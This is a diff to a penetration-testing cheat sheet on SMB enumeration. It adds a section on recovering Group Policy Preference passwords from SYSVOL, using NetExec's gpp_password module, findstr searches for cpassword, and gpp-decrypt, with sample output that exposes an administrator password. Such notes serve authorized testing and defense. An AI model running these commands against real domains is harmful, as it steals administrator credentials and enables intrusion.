@@ -1,7 +1,7 @@
 ---
 title: "SMB Enum"
 date: 2025-7-25
-tags: ["Kerberos", "Nmap", "SID", "Smbclient", "Mount", "Enumeration", "Smb", "Impacket", "Reconnaissance", "Windows", "ADS"]
+tags: ["Kerberos", "Nmap", "SID", "Smbclient", "Mount", "Enumeration", "Smb", "Impacket", "Reconnaissance", "Windows", "ADS", "GPP", "Group Policy Preference", "SYSVOL"]
 ---
 
 ### SMB Share Enum
@@ -398,3 +398,71 @@ sudo touch {/mnt/,./}test.{dll,exe,ini,lnk}
 ```console
 smbpasswd -r <TARGET> -U <USER>
 ```
+
+---
+
+### Enum GPP (Group Policy Perference)
+
+{{< tab set6 tab1 >}}Linux{{< /tab >}}
+{{< tab set6 tab2 >}}Windows{{< /tab >}}
+{{< tabcontent set6 tab1 >}}
+
+```console
+# Password
+nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M gpp_password
+```
+
+```console {class="sample-code"}
+$ nxc smb dc.example.com -u 'apple.seed' -p 'Test1234' -d example.com -M gpp_password
+SMB         224.0.0.1       445    DC            [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:example.com) (signing:True) (SMBv1:True) 
+SMB         224.0.0.1       445    DC            [+] example.com\apple.seed:Test1234 
+SMB         224.0.0.1       445    DC            [*] Enumerated shares
+SMB         224.0.0.1       445    DC            Share           Permissions     Remark
+SMB         224.0.0.1       445    DC            -----           -----------     ------
+SMB         224.0.0.1       445    DC            accounting$                     
+SMB         224.0.0.1       445    DC            ADMIN$                          Remote Admin
+SMB         224.0.0.1       445    DC            C$                              Default share
+SMB         224.0.0.1       445    DC            CertEnroll      READ            Active Directory Certificate Services share
+SMB         224.0.0.1       445    DC            home$           READ            
+SMB         224.0.0.1       445    DC            IPC$            READ            Remote IPC
+SMB         224.0.0.1       445    DC            it$                             
+SMB         224.0.0.1       445    DC            NETLOGON        READ            Logon server share 
+SMB         224.0.0.1       445    DC            SYSVOL          READ            Logon server share 
+SMB         224.0.0.1       445    DC            transfer$       READ,WRITE      
+GPP_PASS... 224.0.0.1       445    DC            [+] Found SYSVOL share
+GPP_PASS... 224.0.0.1       445    DC            [*] Searching for potential XML files containing passwords
+SMB         224.0.0.1       445    DC            [*] Started spidering
+SMB         224.0.0.1       445    DC            [*] Spidering .
+SMB         224.0.0.1       445    DC            //224.0.0.1/SYSVOL/example.com/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml [lastm:'2024-06-04 16:01' size:1135]
+SMB         224.0.0.1       445    DC            [*] Done spidering (Completed in 35.11537528038025)
+GPP_PASS... 224.0.0.1       445    DC            [*] Found example.com/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml
+GPP_PASS... 224.0.0.1       445    DC            [+] Found credentials in example.com/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml
+GPP_PASS... 224.0.0.1       445    DC            Password: P@ssword2024!
+GPP_PASS... 224.0.0.1       445    DC            action: U
+GPP_PASS... 224.0.0.1       445    DC            newName: _local
+GPP_PASS... 224.0.0.1       445    DC            fullName: 
+GPP_PASS... 224.0.0.1       445    DC            description: local administrator
+GPP_PASS... 224.0.0.1       445    DC            changeLogon: 0
+GPP_PASS... 224.0.0.1       445    DC            noChange: 0
+GPP_PASS... 224.0.0.1       445    DC            neverExpires: 1
+GPP_PASS... 224.0.0.1       445    DC            acctDisabled: 0
+GPP_PASS... 224.0.0.1       445    DC            subAuthority: RID_ADMIN
+GPP_PASS... 224.0.0.1       445    DC            userName: Administrator (built-in)
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set6 tab2 >}}
+
+#### 1. Enum
+
+```console
+findstr /S /I cpassword \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\*.xml
+```
+
+#### 2. Decrypt
+
+```console
+gpp-decrypt <HASH>
+```
+
+{{< /tabcontent >}}
